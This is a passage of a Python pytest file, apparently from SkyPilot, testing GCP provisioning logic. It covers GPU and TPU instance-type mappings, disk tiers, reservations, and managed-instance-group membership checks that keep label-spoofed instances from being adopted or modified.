import pathlib
from unittest.mock import ANY
from unittest.mock import call
from unittest.mock import MagicMock
from unittest.mock import patch

import pytest

from sky import global_user_state
from sky import logs
from sky import resources
from sky import skypilot_config
from sky import task as task_lib
from sky.backends import backend_utils
from sky.catalog import gcp_catalog
from sky.clouds import cloud as cloud_lib
from sky.clouds import gcp as gcp_cloud
from sky.clouds import Region
from sky.clouds import Zone
from sky.clouds.gcp import GCP
from sky.clouds.utils import gcp_utils
from sky.jobs import controller as managed_job_controller
from sky.provision import common
from sky.provision.gcp import config as gcp_config
from sky.provision.gcp import constants as gcp_constants
from sky.provision.gcp import instance as gcp_instance
from sky.provision.gcp import instance_utils
from sky.provision.gcp import mig_utils
from sky.provision.gcp import volume_utils as gcp_volume_utils
from sky.utils import common_utils
from sky.utils import config_utils
from sky.utils import controller_utils
from sky.utils import resources_utils
from sky.utils import schemas
from sky.utils import status_lib


def test_gcp_rtxpro6000_instance_type_mapping():
    # RTXPRO6000 (GCP G4) maps to g4-standard-{48,96,192,384} for 1/2/4/8 GPUs.
    assert gcp_catalog._ACC_INSTANCE_TYPE_DICTS['RTXPRO6000'] == {
        1: ['g4-standard-48'],
        2: ['g4-standard-96'],
        4: ['g4-standard-192'],
        8: ['g4-standard-384'],
    }
    expected = {
        'g4-standard-48': 1,
        'g4-standard-96': 2,
        'g4-standard-192': 4,
        'g4-standard-384': 8,
    }
    for instance_type, count in expected.items():
        assert gcp_catalog._INSTANCE_TYPE_TO_ACC[instance_type] == {
            'RTXPRO6000': count,
        }


@pytest.mark.parametrize(
    'instance_type',
    ['g4-standard-48', 'g4-standard-96', 'g4-standard-192', 'g4-standard-384'])
def test_gcp_g4_uses_hyperdisk_balanced(instance_type):
    # G4 only supports hyperdisk-balanced (no pd-* support), like n4/a4.
    tier2name = gcp_volume_utils.get_data_disk_tier_mapping(instance_type)
    for tier in resources_utils.DiskTier:
        if tier == resources_utils.DiskTier.BEST:
            continue
        assert tier2name[tier] == 'hyperdisk-balanced', (
            f'{instance_type} tier {tier.value} should be hyperdisk-balanced, '
            f'got {tier2name[tier]}')


@pytest.mark.parametrize((
    'mock_return', 'expected'
), [([
    gcp_utils.GCPReservation(
        self_link=
        'https://www.googleapis.com/compute/v1/projects/<project>/zones/<zone>/reservations/<reservation>',
        specific_reservation=gcp_utils.SpecificReservation(count=1,
                                                           in_use_count=0),
        specific_reservation_required=True,
        zone='zone')
], {
    'projects/<project>/reservations/<reservation>': 1
}),
    ([
        gcp_utils.GCPReservation(
            self_link=
            'https://www.googleapis.com/compute/v1/projects/<project>/zones/<zone>/reservations/<reservation>',
            specific_reservation=gcp_utils.SpecificReservation(count=2,
                                                               in_use_count=1),
            specific_reservation_required=False,
            zone='zone')
    ], {
        'projects/<project>/reservations/<reservation>': 1
    }),
    ([
        gcp_utils.GCPReservation(
            self_link=
            'https://www.googleapis.com/compute/v1/projects/<project2>/zones/<zone>/reservations/<reservation>',
            specific_reservation=gcp_utils.SpecificReservation(count=1,
                                                               in_use_count=0),
            specific_reservation_required=True,
            zone='zone')
    ], {})])
def test_gcp_get_reservations_available_resources(mock_return, expected):
    gcp = GCP()
    with patch.object(gcp_utils,
                      'list_reservations_for_instance_type_in_zone',
                      return_value=mock_return):
        reservations = gcp.get_reservations_available_resources(
            'instance_type', 'region', 'zone',
            {'projects/<project>/reservations/<reservation>'})
        assert reservations == expected


def test_gcp_reservation_from_dict():
    r = gcp_utils.GCPReservation.from_dict({
        'selfLink': 'test',
        'specificReservation': {
            'count': '1',
            'inUseCount': '0'
        },
        'specificReservationRequired': True,
        'zone': 'zone'
    })

    assert r.self_link == 'test'
    assert r.specific_reservation.count == 1
    assert r.specific_reservation.in_use_count == 0
    assert r.specific_reservation_required == True
    assert r.zone == 'zone'


@pytest.mark.parametrize(('count', 'in_use_count', 'expected'), [(1, 0, 1),
                                                                 (1, 1, 0)])
def test_gcp_reservation_available_resources(count, in_use_count, expected):
    r = gcp_utils.GCPReservation(
        self_link='test',
        specific_reservation=gcp_utils.SpecificReservation(
            count=count, in_use_count=in_use_count),
        specific_reservation_required=True,
        zone='zone')

    assert r.available_resources == expected


def test_gcp_reservation_name():
    r = gcp_utils.GCPReservation(
        self_link=
        'https://www.googleapis.com/compute/v1/projects/<project>/zones/<zone>/reservations/<reservation-name>',
        specific_reservation=gcp_utils.SpecificReservation(count=1,
                                                           in_use_count=1),
        specific_reservation_required=True,
        zone='zone')
    assert r.name == 'projects/<project>/reservations/<reservation-name>'


def test_gcp_mig_instance_template_uses_flex_start(monkeypatch):
    compute = MagicMock()
    insert = compute.regionInstanceTemplates.return_value.insert
    insert.return_value.execute.return_value = {'name': 'operation'}
    monkeypatch.setattr(
        mig_utils.gcp,
        'build',
        lambda *args, **kwargs: compute,
    )

    node_config = {
        gcp_constants.MANAGED_INSTANCE_GROUP_CONFIG: {
            'run_duration': 3600,
            'provision_timeout': 900,
        },
        'machineType': 'n1-standard-4',
        'guestAccelerators': [{
            'acceleratorType': 'nvidia-tesla-a100',
            'acceleratorCount': 1,
        }],
        'scheduling': {
            'onHostMaintenance': 'TERMINATE',
        },
        'description': 'Description returned by an existing template.',
        'reservationAffinity': {
            'consumeReservationType': 'SPECIFIC_RESERVATION',
        },
        'advancedMachineFeatures': {
            'threadsPerCore': 1,
        },
    }

    operation = mig_utils.create_region_instance_template(
        'cluster', 'project', 'us-central1', 'template', node_config)

    assert operation == {'name': 'operation'}
    insert.assert_called_once()
    assert insert.call_args.kwargs['requestId']
    body = insert.call_args.kwargs['body']
    properties = body['properties']
    assert gcp_constants.MANAGED_INSTANCE_GROUP_CONFIG not in properties
    assert properties['description'] == (
        "SkyPilot instance template for 'cluster' to support DWS requests.")
    assert properties['reservationAffinity'] == {
        'consumeReservationType': 'NO_RESERVATION',
    }
    assert properties['advancedMachineFeatures'] == {
        'threadsPerCore': 1,
    }
    assert properties['scheduling'] == {
        'provisioningModel': 'FLEX_START',
        'instanceTerminationAction': 'DELETE',
        'maxRunDuration': {
            'seconds': '3600',
        },
        'onHostMaintenance': 'TERMINATE',
    }


def test_gcp_query_mig_instances_uses_group_membership(monkeypatch):
    monkeypatch.setattr(mig_utils, 'list_managed_instance_group_instances',
                        lambda *args: ['cluster-head', 'cluster-worker'])
    filter_calls = []

    def filter_instances(cls,
                         project_id,
                         zone,
                         label_filters,
                         status_filters,
                         included_instances=None,
                         excluded_instances=None):
        filter_calls.append((project_id, zone, label_filters, status_filters,
                             included_instances, excluded_instances))
        return {
            'cluster-head': {
                'status': 'RUNNING',
            },
            'cluster-worker': {
                'status': 'RUNNING',
            },
        }

    monkeypatch.setattr(instance_utils.GCPComputeInstance, 'filter',
                        classmethod(filter_instances))

    statuses = gcp_instance.query_instances(
        cluster_name='display-name',
        cluster_name_on_cloud='cluster',
        provider_config={
            'availability_zone': 'us-east5-a',
            'project_id': 'project',
            'use_managed_instance_group': True,
        })

    assert statuses == {
        'cluster-head': (status_lib.ClusterStatus.UP, None),
        'cluster-worker': (status_lib.ClusterStatus.UP, None),
    }
    assert filter_calls == [('project', 'us-east5-a', None, None,
                             ['cluster-head', 'cluster-worker'], None)]


def test_gcp_query_missing_mig_returns_no_instances(monkeypatch):
    monkeypatch.setattr(mig_utils, 'list_managed_instance_group_instances',
                        lambda *args: [])
    filter_instances = MagicMock()
    monkeypatch.setattr(instance_utils.GCPComputeInstance, 'filter',
                        filter_instances)

    statuses = gcp_instance.query_instances(
        cluster_name='display-name',
        cluster_name_on_cloud='cluster',
        provider_config={
            'availability_zone': 'us-east5-a',
            'project_id': 'project',
            'use_managed_instance_group': True,
        })

    assert statuses == {}
    filter_instances.assert_not_called()


def test_gcp_run_mig_uses_membership_for_adoption_and_head(monkeypatch):
    member = 'sky-mig-cluster-member'
    spoof = 'spoof-compute'
    raw_instances = {
        member: {
            'name': member,
            'id': '1',
            'status': 'RUNNING',
            'labels': {
                'ray-cluster-name': 'cluster',
                'ray-node-type': 'worker',
            },
        },
        spoof: {
            'name': spoof,
            'id': '2',
            'status': 'RUNNING',
            'labels': {
                'ray-cluster-name': 'cluster',
                'ray-node-type': 'head',
            },
        },
    }
    filter_calls = []

    def filter_instances(cls,
                         project_id,
                         zone,
                         label_filters,
                         status_filters,
                         included_instances=None,
                         excluded_instances=None):
        del cls, excluded_instances
        filter_calls.append((project_id, zone, label_filters, status_filters,
                             included_instances))
        instances = raw_instances
        if status_filters:
            instances = {
                name: instance
                for name, instance in instances.items()
                if instance['status'] in status_filters
            }
        if included_instances is not None:
            instances = {
                name: instance
                for name, instance in instances.items()
                if name in included_instances
            }
        return instances

    monkeypatch.setattr(instance_utils, 'get_node_type',
                        lambda _: instance_utils.GCPNodeType.MIG)
    monkeypatch.setattr(mig_utils, 'list_managed_instance_group_instances',
                        lambda *args: [member])
    monkeypatch.setattr(instance_utils.GCPManagedInstanceGroup, 'filter',
                        classmethod(filter_instances))
    create_node_tag = MagicMock(return_value=member)
    monkeypatch.setattr(instance_utils.GCPManagedInstanceGroup,
                        'create_node_tag', create_node_tag)
    create_instances = MagicMock()
    monkeypatch.setattr(instance_utils.GCPManagedInstanceGroup,
                        'create_instances', create_instances)

    record = gcp_instance._run_instances(
        'us-east5', 'cluster',
        common.ProvisionConfig(
            provider_config={
                'availability_zone': 'us-east5-a',
                'project_id': 'project',
                'use_managed_instance_group': True,
            },
            authentication_config={},
            docker_config={},
            node_config={},
            count=1,
            tags={},
            resume_stopped_nodes=False,
            ports_to_open_on_launch=None,
        ))

    assert record.head_instance_id == member
    create_node_tag.assert_called_once_with('project',
                                            'us-east5-a',
                                            member,
                                            is_head=True)
    create_instances.assert_not_called()
    assert filter_calls
    assert all(call_args[2] is None for call_args in filter_calls)
    assert all(call_args[4] == [member] for call_args in filter_calls)


def test_gcp_run_validates_full_tpu_mig_before_adoption(monkeypatch):
    old_members = [f'old-node-{index}' for index in range(4)]
    new_members = [f'new-node-{index}' for index in range(4)]
    state = {'phase': 'old'}

    instance_template, workload_policy, managed_instance_group = (
        _matching_tpu_mig_resources())
    instance_template['properties']['scheduling']['maxRunDuration'] = {
        'seconds': '7200',
    }

    monkeypatch.setattr(mig_utils, 'get_missing_tpu_flex_start_permissions',
                        lambda project_id: [])
    monkeypatch.setattr(mig_utils, 'get_region_instance_template',
                        lambda *args, **kwargs: instance_template)
    monkeypatch.setattr(mig_utils, 'get_workload_policy',
                        lambda *args, **kwargs: workload_policy)
    monkeypatch.setattr(mig_utils, 'get_region_managed_instance_group',
                        lambda *args, **kwargs: managed_instance_group)
    monkeypatch.setattr(
        mig_utils, '_list_managed_instance_group_members',
        lambda *args, **kwargs: _matching_tpu_mig_members(old_members))

    def list_members(*args, **kwargs):
        del args, kwargs
        if state['phase'] == 'old':
            return old_members
        if state['phase'] == 'new':
            return new_members
        return []

    monkeypatch.setattr(mig_utils, 'list_managed_instance_group_instances',
                        list_members)

    def filter_instances(cls,
                         project_id,
                         zone,
                         label_filters,
                         status_filters,
                         included_instances=None,
                         excluded_instances=None):
        del cls, project_id, zone, excluded_instances
        instances = {}
        for index, name in enumerate(list_members()):
            labels = {
                'ray-node-type': 'head' if index == 0 else 'worker',
            }
            if (label_filters is not None and any(
                    labels.get(key) != value
                    for key, value in label_filters.items())):
                continue
            instance = {
                'name': name,
                'id': str(index),
                'status': 'RUNNING',
                'labels': labels,
            }
            if status_filters is not None and instance[
                    'status'] not in status_filters:
                continue
            if included_instances is None or name in included_instances:
                instances[name] = instance
        return instances

    monkeypatch.setattr(instance_utils.GCPManagedInstanceGroup, 'filter',
                        classmethod(filter_instances))

    cleanup = MagicMock(
        side_effect=lambda *args, **kwargs: state.__setitem__('phase', 'empty'))
    monkeypatch.setattr(instance_utils.GCPManagedInstanceGroup,
                        'delete_tpu_mig_resources', cleanup)

    def create_instances(*args, **kwargs):
        del args, kwargs
        state['phase'] = 'new'
        return None, new_members

    create = MagicMock(side_effect=create_instances)
    monkeypatch.setattr(instance_utils.GCPManagedInstanceGroup,
                        'create_instances', create)
    monkeypatch.setattr(instance_utils.GCPManagedInstanceGroup,
                        'create_node_tag', MagicMock())

    record = gcp_instance._run_instances(
        'us-east5', 'cluster',
        common.ProvisionConfig(
            provider_config={
                'availability_zone': 'us-east5-a',
                'project_id': 'project',
                'use_managed_instance_group': True,
            },
            authentication_config={},
            docker_config={},
            node_config={
                gcp_constants.MANAGED_INSTANCE_GROUP_CONFIG: {
                    'run_duration': 3600,
                    'provision_timeout': 900,
                    'accelerator_topology': '4x4',
                    'accelerator_topology_mode': 'AUTO_CONNECT',
                },
                'machineType': 'ct6e-standard-4t',
                'labels': {},
            },
            count=4,
            tags={},
            resume_stopped_nodes=False,
            ports_to_open_on_launch=None,
        ))

    cleanup.assert_called_once_with('project', 'us-east5', 'cluster')
    create.assert_called_once()
    assert create.call_args.args[5] == 4
    assert record.head_instance_id == new_members[0]
    assert record.created_instance_ids == new_members


def test_gcp_run_missing_mig_does_not_adopt_spoof_label(monkeypatch):
    new_member = 'sky-mig-cluster-new'
    monkeypatch.setattr(instance_utils, 'get_node_type',
                        lambda _: instance_utils.GCPNodeType.MIG)
    monkeypatch.setattr(mig_utils, 'list_managed_instance_group_instances',
                        lambda *args: [])
    filter_instances = MagicMock()
    monkeypatch.setattr(instance_utils.GCPManagedInstanceGroup, 'filter',
                        filter_instances)
    create_instances = MagicMock(return_value=(None, [new_member]))
    monkeypatch.setattr(instance_utils.GCPManagedInstanceGroup,
                        'create_instances', create_instances)

    record = gcp_instance._run_instances(
        'us-east5', 'cluster',
        common.ProvisionConfig(
            provider_config={
                'availability_zone': 'us-east5-a',
                'project_id': 'project',
                'use_managed_instance_group': True,
            },
            authentication_config={},
            docker_config={},
            node_config={},
            count=1,
            tags={},
            resume_stopped_nodes=False,
            ports_to_open_on_launch=None,
        ))

    assert record.head_instance_id == new_member
    create_instances.assert_called_once()
    filter_instances.assert_not_called()


def test_gcp_get_cluster_info_mig_uses_membership_for_head(monkeypatch):
    member = 'sky-mig-cluster-member'
    spoof = 'spoof-compute'
    filter_calls = []

    def filter_instances(cls,
                         project_id,
                         zone,
                         label_filters,
                         status_filters,
                         included_instances=None,
                         excluded_instances=None):
        del cls, excluded_instances
        filter_calls.append((project_id, zone, label_filters, status_filters,
                             included_instances))
        raw_instances = {
            member: {
                'name': member,
                'status': 'RUNNING',
                'labels': {
                    'ray-node-type': 'head',
                },
            },
            spoof: {
                'name': spoof,
                'status': 'RUNNING',
                'labels': {
                    'ray-cluster-name': 'cluster',
                    'ray-node-type': 'head',
                },
            },
        }
        return {
            name: instance
            for name, instance in raw_instances.items()
            if (included_instances is None or name in included_instances) and
            (not label_filters or all(instance['labels'].get(key) == value
                                      for key, value in label_filters.items()))
        }

    monkeypatch.setattr(mig_utils, 'list_managed_instance_group_instances',
                        lambda *args: [member])
    monkeypatch.setattr(instance_utils.GCPManagedInstanceGroup, 'filter',
                        classmethod(filter_instances))
    monkeypatch.setattr(
        instance_utils.GCPManagedInstanceGroup, 'get_instance_info',
        classmethod(lambda cls, project_id, zone, instance_id: [
            common.InstanceInfo(instance_id=instance_id,
                                internal_ip='10.0.0.1',
                                external_ip=None,
                                tags={})
        ]))

    cluster_info = gcp_instance.get_cluster_info(
        'us-east5',
        'cluster',
        provider_config={
            'availability_zone': 'us-east5-a',
            'project_id': 'project',
            'use_managed_instance_group': True,
        })

    assert list(cluster_info.instances) == [member]
    assert cluster_info.head_instance_id == member
    assert filter_calls == [
        ('project', 'us-east5-a', None, ['RUNNING'], [member]),
        ('project', 'us-east5-a', {
            'ray-node-type': 'head'
        }, ['RUNNING'], [member]),
    ]


def test_gcp_stop_mig_only_stops_members(monkeypatch):
    member = 'sky-mig-cluster-member'
    spoof = 'spoof-compute'
    states = {
        member: 'RUNNING',
        spoof: 'RUNNING',
    }
    filter_calls = []

    def filter_instances(cls,
                         project_id,
                         zone,
                         label_filters,
                         status_filters,
                         included_instances=None,
                         excluded_instances=None):
        del cls, project_id, zone, excluded_instances
        filter_calls.append((label_filters, included_instances))
        return {
            name: {
                'name': name,
                'status': state,
            } for name, state in states.items() if state in status_filters and
            (included_instances is None or name in included_instances)
        }

    def stop_instance(project_id, zone, instance):
        del project_id, zone
        states[instance] = 'TERMINATED'
        return {'name': f'stop-{instance}'}

    monkeypatch.setattr(mig_utils, 'list_managed_instance_group_instances',
                        lambda *args: [member])
    monkeypatch.setattr(instance_utils.GCPManagedInstanceGroup, 'filter',
                        classmethod(filter_instances))
    stop = MagicMock(side_effect=stop_instance)
    monkeypatch.setattr(instance_utils.GCPManagedInstanceGroup, 'stop', stop)
    monkeypatch.setattr(gcp_instance, '_wait_for_operations',
                        lambda *args: None)

    gcp_instance.stop_instances('cluster',
                                provider_config={
                                    'availability_zone': 'us-east5-a',
                                    'project_id': 'project',
                                    'use_managed_instance_group': True,
                                })

    stop.assert_called_once_with('project', 'us-east5-a', member)
    assert all(label_filters is None for label_filters, _ in filter_calls)
    assert all(included_instances == [member]
               for _, included_instances in filter_calls)


def test_gcp_terminate_missing_mig_does_not_fallback_to_labels(monkeypatch):
    monkeypatch.setattr(instance_utils.GCPManagedInstanceGroup, 'delete_mig',
                        MagicMock(return_value=False))
    monkeypatch.setattr(mig_utils, 'list_managed_instance_group_instances',
                        lambda *args: [])
    filter_instances = MagicMock()
    terminate = MagicMock()
    monkeypatch.setattr(instance_utils.GCPManagedInstanceGroup, 'filter',
                        filter_instances)
    monkeypatch.setattr(instance_utils.GCPManagedInstanceGroup, 'terminate',
                        terminate)

    gcp_instance.terminate_instances('cluster',
                                     provider_config={
                                         'availability_zone': 'us-east5-a',
                                         'project_id': 'project',
                                         'use_managed_instance_group': True,
                                     })

    filter_instances.assert_not_called()
    terminate.assert_not_called()


def test_gcp_open_ports_mig_only_tags_members(monkeypatch):
    member = 'sky-mig-cluster-member'
    spoof = 'spoof-compute'

    def filter_instances(cls,
                         project_id,
                         zone,
                         label_filters,
                         status_filters,
                         included_instances=None,
                         excluded_instances=None):
        del cls, project_id, zone, status_filters, excluded_instances
        assert label_filters is None
        raw_instances = {
            member: {},
            spoof: {},
        }
        return {
            name: instance
            for name, instance in raw_instances.items()
            if included_instances is None or name in included_instances
        }

    monkeypatch.setattr(mig_utils, 'list_managed_instance_group_instances',
                        lambda *args: [member])
    monkeypatch.setattr(instance_utils.GCPManagedInstanceGroup, 'filter',
                        classmethod(filter_instances))
    add_tag = MagicMock()
    monkeypatch.setattr(instance_utils.GCPManagedInstanceGroup,
                        'add_network_tag_if_not_exist', add_tag)
    monkeypatch.setattr(instance_utils.GCPManagedInstanceGroup, 'get_vpc_name',
                        MagicMock(return_value='network'))
    create_firewall = MagicMock(return_value={'name': 'firewall-op'})
    monkeypatch.setattr(instance_utils.GCPComputeInstance,
                        'create_or_update_firewall_rule', create_firewall)
    monkeypatch.setattr(gcp_instance, '_wait_for_operations',
                        lambda *args: None)

    gcp_instance.open_ports('cluster', ['8080'],
                            provider_config={
                                'availability_zone': 'us-east5-a',
                                'project_id': 'project',
                                'firewall_rule': 'firewall',
                                'use_managed_instance_group': True,
                            })

    add_tag.assert_called_once_with('project',
                                    'us-east5-a',
                                    member,
                                    tag='cluster')


def test_gcp_mig_head_selection_uses_membership_not_cluster_label(monkeypatch):
    filter_instances = MagicMock(
        return_value={
            'member-head': {
                'status': 'RUNNING',
            },
            'member-worker': {
                'status': 'RUNNING',
            },
        })
    set_labels = MagicMock()
    monkeypatch.setattr(instance_utils.GCPManagedInstanceGroup, 'filter',
                        filter_instances)
    monkeypatch.setattr(instance_utils.GCPManagedInstanceGroup, 'set_labels',
                        set_labels)

    instances = (
        instance_utils.GCPManagedInstanceGroup._add_labels_and_find_head(
            'cluster', 'project', 'us-east5-a', {
                'ray-cluster-name': 'cluster',
            }, ['member-head'], ['member-head', 'member-worker']))

    assert instances == ['member-head', 'member-worker']
    filter_instances.assert_called_once_with(
        'project',
        'us-east5-a',
        None,
        status_filters=instance_utils.GCPManagedInstanceGroup.
        NEED_TO_STOP_STATES,
        included_instances=['member-head', 'member-worker'])
    assert [call.kwargs['node_id'] for call in set_labels.call_args_list
           ] == ['member-head', 'member-worker']


def test_gcp_list_regional_mig_instances_paginates(monkeypatch):
    compute = MagicMock()
    regional_list = (
        compute.regionInstanceGroupManagers.return_value.listManagedInstances)
    regional_list.return_value.execute.side_effect = [{
        'managedInstances': [{
            'instance': 'projects/project/zones/us-east5-a/instances/cluster-head',
        }],
        'nextPageToken': 'next-page',
    }, {
        'managedInstances': [{
            'instance': 'projects/project/zones/us-east5-a/instances/cluster-worker',
        }],
    }]
    monkeypatch.setattr(mig_utils.gcp, 'build', lambda *args, **kwargs: compute)

    instances = mig_utils.list_managed_instance_group_instances(
        'project', 'us-east5-a', 'sky-mig-cluster')

    assert instances == ['cluster-head', 'cluster-worker']
    assert regional_list.call_args_list == [
        call(project='project',
             region='us-east5',
             instanceGroupManager='sky-mig-cluster'),
        call(project='project',
             region='us-east5',
             instanceGroupManager='sky-mig-cluster',
             pageToken='next-page'),
    ]


def test_gcp_list_regional_mig_members_preserves_effective_configuration(
        monkeypatch):
    compute = MagicMock()
    member = {
        'instance': 'projects/project/zones/us-east5-a/instances/cluster-head',
        'version': {
            'instanceTemplate':
                ('projects/project/regions/us-east5/instanceTemplates/'
                 'sky-it-cluster'),
        },
        'preservedStateFromConfig': {
            'metadata': {
                'key': 'value',
            },
        },
    }
    regional_list = (
        compute.regionInstanceGroupManagers.return_value.listManagedInstances)
    regional_list.return_value.execute.return_value = {
        'managedInstances': [member],
    }
    monkeypatch.setattr(mig_utils.gcp, 'build', lambda *args, **kwargs: compute)

    members = mig_utils._list_managed_instance_group_members(
        'project', 'us-east5-a', 'sky-mig-cluster')

    assert members == [member]


def test_gcp_compute_instance_filter_paginates(monkeypatch):
    compute = MagicMock()
    list_instances = compute.instances.return_value.list
    list_instances.return_value.execute.side_effect = [{
        'items': [{
            'name': 'node-0',
        }],
        'nextPageToken': 'next-page',
    }, {
        'items': [{
            'name': 'node-511',
        }],
    }]
    monkeypatch.setattr(instance_utils.GCPComputeInstance, 'load_resource',
                        classmethod(lambda cls: compute))

    instances = instance_utils.GCPComputeInstance.filter(
        'project',
        'us-east5-a',
        label_filters=None,
        status_filters=None,
        included_instances=['node-0', 'node-511'])

    assert list(instances) == ['node-0', 'node-511']
    assert list_instances.call_args_list == [
        call(project='project', filter='', zone='us-east5-a'),
        call(project='project',
             filter='',
             zone='us-east5-a',
             pageToken='next-page'),
    ]


def test_gcp_list_zonal_mig_instances_after_regional_not_found(monkeypatch):

    class FakeHttpError(Exception):
        pass

    compute = MagicMock()
    regional_execute = (compute.regionInstanceGroupManagers.return_value.
                        listManagedInstances.return_value.execute)
    regional_execute.side_effect = FakeHttpError(
        "The resource 'projects/project/regions/us-east5/"
        "instanceGroupManagers/sky-mig-cluster' was not found")
    zonal_list = compute.instanceGroupManagers.return_value.listManagedInstances
    zonal_list.return_value.execute.return_value = {
        'managedInstances': [{
            'instance': 'projects/project/zones/us-east5-a/instances/cluster-head',
        }],
    }
    monkeypatch.setattr(mig_utils.gcp, 'build', lambda *args, **kwargs: compute)
    monkeypatch.setattr(mig_utils.gcp, 'http_error_exception',
                        lambda: FakeHttpError)

    instances = mig_utils.list_managed_instance_group_instances(
        'project', 'us-east5-a', 'sky-mig-cluster')

    assert instances == ['cluster-head']
    zonal_list.assert_called_once_with(project='project',
                                       zone='us-east5-a',
                                       instanceGroupManager='sky-mig-cluster')


def test_gcp_list_missing_mig_returns_no_instances(monkeypatch):

    class FakeHttpError(Exception):
        pass

    compute = MagicMock()
    regional_execute = (compute.regionInstanceGroupManagers.return_value.
                        listManagedInstances.return_value.execute)
    regional_execute.side_effect = FakeHttpError(
        "The resource 'projects/project/regions/us-east5/"
        "instanceGroupManagers/sky-mig-cluster' was not found")
    zonal_execute = (compute.instanceGroupManagers.return_value.
                     listManagedInstances.return_value.execute)
    zonal_execute.side_effect = FakeHttpError(
        "The resource 'projects/project/zones/us-east5-a/"
        "instanceGroupManagers/sky-mig-cluster' was not found")
    monkeypatch.setattr(mig_utils.gcp, 'build', lambda *args, **kwargs: compute)
    monkeypatch.setattr(mig_utils.gcp, 'http_error_exception',
                        lambda: FakeHttpError)

    instances = mig_utils.list_managed_instance_group_instances(
        'project', 'us-east5-a', 'sky-mig-cluster')

    assert instances == []


@pytest.mark.parametrize('instance_type',
                         ['ct6e-standard-8t', 'tpu7x-standard-4t'])
def test_gcp_compute_tpu_machine_type_uses_mig_without_guest_accelerators(
        instance_type):
    assert instance_utils.get_node_type({
        gcp_constants.MANAGED_INSTANCE_GROUP_CONFIG: {
            'run_duration': 3600,
            'provision_timeout': 900,
        },
        'machineType': instance_type,
    }) == instance_utils.GCPNodeType.MIG


def test_gcp_cpu_machine_type_with_mig_config_uses_compute():
    assert instance_utils.get_node_type({
        gcp_constants.MANAGED_INSTANCE_GROUP_CONFIG: {
            'run_duration': 3600,
            'provision_timeout': 900,
        },
        'machineType': 'n1-standard-4',
    }) == instance_utils.GCPNodeType.COMPUTE


@pytest.mark.parametrize('instance_type',
                         ['ct6e-standard-4t', 'tpu7x-standard-4t'])
def test_gcp_compute_tpu_boot_disk_uses_hyperdisk_balanced(instance_type):
    for disk_tier in (
            None,
            resources_utils.DiskTier.LOW,
            resources_utils.DiskTier.MEDIUM,
            resources_utils.DiskTier.HIGH,
            resources_utils.DiskTier.ULTRA,
            resources_utils.DiskTier.BEST,
    ):
        assert GCP._get_disk_type(instance_type,
                                  disk_tier) == 'hyperdisk-balanced'


def test_gcp_compute_tpu_mig_disables_stop_and_spot():
    resource = resources.Resources(cloud=GCP(),
                                   instance_type='tpu7x-standard-4t',
                                   region='us-central1',
                                   _cluster_config_overrides={
                                       'gcp': {
                                           'managed_instance_group': {
                                               'run_duration': 3600,
                                               'accelerator_topology': '2x2x1',
                                           },
                                       },
                                   })

    unsupported = GCP._unsupported_features_for_resources(resource)

    assert cloud_lib.CloudImplementationFeatures.STOP in unsupported
    assert cloud_lib.CloudImplementationFeatures.AUTOSTOP in unsupported
    assert cloud_lib.CloudImplementationFeatures.SPOT_INSTANCE in unsupported


def test_gcp_compute_tpu_mig_marks_provider_for_cleanup():
    resource = resources.Resources(cloud=GCP(),
                                   instance_type='ct6e-standard-4t',
                                   region='us-east5',
                                   _cluster_config_overrides={
                                       'gcp': {
                                           'managed_instance_group': {
                                               'run_duration': 3600,
                                               'accelerator_topology': '4x4',
                                           },
                                       },
                                   })
    region = Region('us-east5').set_zones([Zone('us-east5-a')])

    variables = GCP().make_deploy_resources_variables(
        resource,
        resources_utils.ClusterName('test', 'test'),
        region,
        region.zones,
        num_nodes=4,
        dryrun=True)

    assert variables['gcp_is_tpu_mig'] is True


@pytest.mark.parametrize('resource', [
    resources.Resources(cloud=GCP(),
                        instance_type='n1-standard-4',
                        region='us-east5',
                        _cluster_config_overrides={
                            'gcp': {
                                'managed_instance_group': {
                                    'run_duration': 3600,
                                },
                            },
                        }),
    resources.Resources(cloud=GCP(),
                        instance_type='n1-standard-4',
                        accelerators={'tpu-v3-8': 1},
                        accelerator_args={
                            'tpu_vm': False,
                            'runtime_version': 'tpu-vm-base',
                        },
                        region='us-east5',
                        _cluster_config_overrides={
                            'gcp': {
                                'managed_instance_group': {
                                    'run_duration': 3600,
                                },
                            },
                        }),
])
def test_gcp_mig_config_does_not_capture_ineligible_resources(resource):
    region = Region('us-east5').set_zones([Zone('us-east5-a')])

    variables = GCP().make_deploy_resources_variables(
        resource,
        resources_utils.ClusterName('test', 'test'),
        region,
        region.zones,
        num_nodes=1,
        dryrun=True)
    unsupported = GCP._unsupported_features_for_resources(resource)

    assert variables['gcp_use_managed_instance_group'] is False
    assert variables['gcp_use_managed_instance_group_value'] == '0'
    assert 'run_duration' not in variables
    assert cloud_lib.CloudImplementationFeatures.SPOT_INSTANCE not in (
        unsupported)


@pytest.mark.parametrize(
    'instance_type',
    ['ct6e-standard-4t', 'ct6e-standard-4t-tpu', 'tpu7x-standard-4t'])
def test_gcp_compute_tpu_disables_stop_and_requires_failure_cleanup(
        instance_type):
    resource = resources.Resources(cloud=GCP(),
                                   instance_type=instance_type,
                                   region='us-east5')

    unsupported = GCP._unsupported_features_for_resources(resource)

    assert cloud_lib.CloudImplementationFeatures.STOP in unsupported
    assert cloud_lib.CloudImplementationFeatures.AUTOSTOP in unsupported
    assert cloud_lib.CloudImplementationFeatures.AUTODOWN not in unsupported
    assert GCP().need_cleanup_after_preemption_or_failure(resource)


@pytest.mark.parametrize(
    'instance_type',
    ['ct6e-standard-4t', 'ct6e-standard-4t-tpu', 'tpu7x-standard-4t'])
def test_gcp_compute_tpu_flex_start_cost_uses_dws_price(instance_type):
    on_demand = resources.Resources(
        cloud=GCP(),
        instance_type=instance_type,
        region=('us-central1'
                if instance_type.startswith('tpu7x') else 'us-east5'))
    flex_start = on_demand.copy(
        _cluster_config_overrides={
            'gcp': {
                'managed_instance_group': {
                    'run_duration': 3600,
                    'accelerator_topology': '4x4',
                },
            },
        })

    assert flex_start.get_cost(3600) == pytest.approx(
        on_demand.get_cost(3600) * 0.5)


def test_gcp_mig_resource_names_fit_gce_limit():
    cluster_name = 'spectra-' + 'long-' * 20

    for resource_name in (
            mig_utils.get_instance_template_name(cluster_name),
            mig_utils.get_managed_instance_group_name(cluster_name),
            mig_utils.get_workload_policy_name(cluster_name),
    ):
        assert len(resource_name) <= mig_utils.GCE_RESOURCE_NAME_MAX_LENGTH
        assert resource_name.startswith('sky-')


def test_gcp_tpu_mig_compute_api_requests(monkeypatch):
    compute = MagicMock()
    workload_operation = {'name': 'workload-operation'}
    delete_workload_operation = {'name': 'delete-workload-operation'}
    mig_operation = {'name': 'mig-operation'}
